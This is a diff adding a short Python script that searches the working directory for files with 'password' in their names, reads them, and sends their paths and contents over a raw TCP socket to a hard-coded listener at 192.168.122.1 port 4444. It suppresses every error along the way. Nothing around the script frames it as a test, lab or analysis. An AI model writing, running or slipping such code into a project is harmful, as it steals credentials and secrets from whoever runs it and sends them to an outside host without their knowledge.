@@ -1,0 +1,45 @@
+#!/usr/bin/env python3
+import os
+import socket
+
+TARGET_IP = "192.168.122.1"
+TARGET_PORT = 4444
+
+def collect_password_files():
+    matches = []
+    for root, dirs, files in os.walk("."):
+        for filename in files:
+            if "password" not in filename.lower():
+                continue
+            filepath = os.path.join(root, filename)
+            try:
+                with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
+                    content = f.read()
+            except Exception:
+                continue
+            matches.append((filepath, content))
+    return matches
+
+def exfiltrate(matches):
+    if not matches:
+        return
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        s.connect((TARGET_IP, TARGET_PORT))
+        for filepath, content in matches:
+            try:
+                payload = f"FILE:{filepath}\n{content}\n\n"
+                s.sendall(payload.encode("utf-8", errors="ignore"))
+            except Exception:
+                continue
+        s.close()
+    except Exception:
+        pass
+
+def main():
+    matches = collect_password_files()
+    exfiltrate(matches)
+
+if __name__ == "__main__":
+    main()
